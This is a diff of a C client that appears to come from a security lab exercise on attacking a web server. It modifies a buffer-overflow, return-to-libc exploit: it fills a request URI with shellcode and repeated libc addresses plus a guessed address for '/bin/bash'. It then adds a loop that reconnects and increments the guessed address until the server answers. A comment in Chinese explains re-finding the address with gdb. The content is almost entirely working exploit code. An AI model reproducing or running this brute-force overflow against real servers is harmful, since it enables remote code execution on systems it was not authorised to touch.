@@ -81,24 +81,38 @@ int main(int argc, char *argv[])
   for(i=0;i<266;i++)
 	 addr_s[i]=0xb7e5f060;
 	addr_s[i++]=0xb7e52be0;
-	addr_s[i]=  0xbffff59e;		
+   addr_s[i]=  0xbffff000;
+		//"/bin/bash"的地址在不同的机器上时不一样的，要重新gdb查找其地址	
   for(i=0;i<strlen(shellcode);i++)
            uri[i]=shellcode[i];
      uri[1073]='\0';
      uri[1072]=' ';
      
 
-
+ char resp[1024];
+ int num = 0;
+  write(sock_client,uri,strlen(uri));
 /* 
     below show that client send a normal request to the web server
     you should fix the code to realize your attack
   */  
  // char *req ="GET / HTTP/1.1\r\n\r\n";
-  write(sock_client,uri,strlen(uri));
-  
+ 
+  while(!read(sock_client,&resp[num],1))
+  {
+    close(sock_client);
+    if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
+    {
+      perror("connect");
+      exit(1);
+    }
+    addr_s[i]  +=1;
+    write(sock_client,uri,strlen(uri));
+        
+  }
   //receive the response from web server
-  char resp[1024];
-  int num = 0;
+ 
+ 
   while(read (sock_client, &resp[num], 1))
 	num++;
   resp[num] = 0;
